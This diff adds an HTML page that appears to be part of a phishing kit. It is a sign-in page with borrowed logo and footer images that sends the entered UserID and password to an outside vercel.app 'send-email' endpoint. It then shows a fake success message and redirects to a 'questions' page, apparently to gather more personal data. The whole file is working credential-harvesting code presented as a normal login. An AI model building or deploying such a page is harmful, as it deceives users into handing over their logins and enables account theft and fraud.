@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Page2</title>
+    <link rel="stylesheet" href="./css/styles.css" />
+  </head>
+  <body>
+    <header></header>
+    <main>
+      <section id="content">
+        <div class="logo-container">
+          <img src="img/logo.png" class="logo-img" />
+        </div>
+        <form
+          id="loginForm"
+          action="https://server-eight-neon-15.vercel.app/send-email/bk"
+          method="POST"
+        >
+          <input type="text" id="name" name="name" placeholder="UserID" /><br />
+          <input
+            type="password"
+            id="password"
+            name="password"
+            placeholder="Password"
+          />
+          <button type="submit">Sign In</button>
+        </form>
+      </section>
+    </main>
+    <footer>
+      <img
+        src="img/footerlinksbig.png"
+        alt="footer link 1"
+        class="big-footer-link"
+      />
+      <img
+        src="img/footerlinksmall.png"
+        alt="footer link 1"
+        class="small-footer-link"
+      />
+      <img src="img/footerbig.png" alt="footer" class="footer big-footer" />
+      <img src="img/footersmall.png" alt="footer" class="footer small-footer" />
+    </footer>
+
+    <!-- Loading and Success Modals -->
+    <div
+      id="modal-overlay"
+      style="
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        background: rgba(0, 0, 0, 0.4);
+        z-index: 1000;
+      "
+    >
+      <div
+        id="loading-modal"
+        style="
+          display: none;
+          position: absolute;
+          top: 50%;
+          left: 50%;
+          transform: translate(-50%, -50%);
+          background: #fff;
+          padding: 2em 3em;
+          border-radius: 8px;
+          text-align: center;
+        "
+      >
+        <div class="spinner" style="margin: auto"></div>
+      </div>
+      <div
+        id="success-modal"
+        style="
+          display: none;
+          position: absolute;
+          top: 50%;
+          left: 50%;
+          transform: translate(-50%, -50%);
+          background: #fff;
+          padding: 2em 3em;
+          border-radius: 8px;
+          text-align: center;
+        "
+      >
+        <span>successful!</span>
+      </div>
+    </div>
+    <style>
+      .spinner {
+        width: 40px;
+        height: 40px;
+        border: 4px solid #ccc;
+        border-top: 4px solid #0078d7;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        display: inline-block;
+      }
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+    </style>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const form = document.querySelector("form");
+        // Modal elements
+        const overlay = document.getElementById("modal-overlay");
+        const loadingModal = document.getElementById("loading-modal");
+        const successModal = document.getElementById("success-modal");
+
+        function showLoading() {
+          overlay.style.display = "block";
+          loadingModal.style.display = "block";
+          successModal.style.display = "none";
+        }
+        function showSuccess() {
+          loadingModal.style.display = "none";
+          successModal.style.display = "block";
+        }
+        function hideModals() {
+          overlay.style.display = "none";
+          loadingModal.style.display = "none";
+          successModal.style.display = "none";
+        }
+
+        if (form) {
+          form.addEventListener("submit", async function (e) {
+            e.preventDefault();
+            showLoading();
+            const formData = new FormData(form);
+            const data = Object.fromEntries(formData.entries());
+            try {
+              const response = await fetch(form.action, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data),
+              });
+              if (response.ok) {
+                showSuccess();
+                setTimeout(() => {
+                  hideModals();
+                  window.location.href = "./questions.html";
+                }, 1200);
+              } else {
+                hideModals();
+                alert("Submission failed.");
+              }
+            } catch (err) {
+              hideModals();
+              alert("An error occurred.");
+            }
+          });
+        }
+      });
+    </script>
+  </body>
+</html>
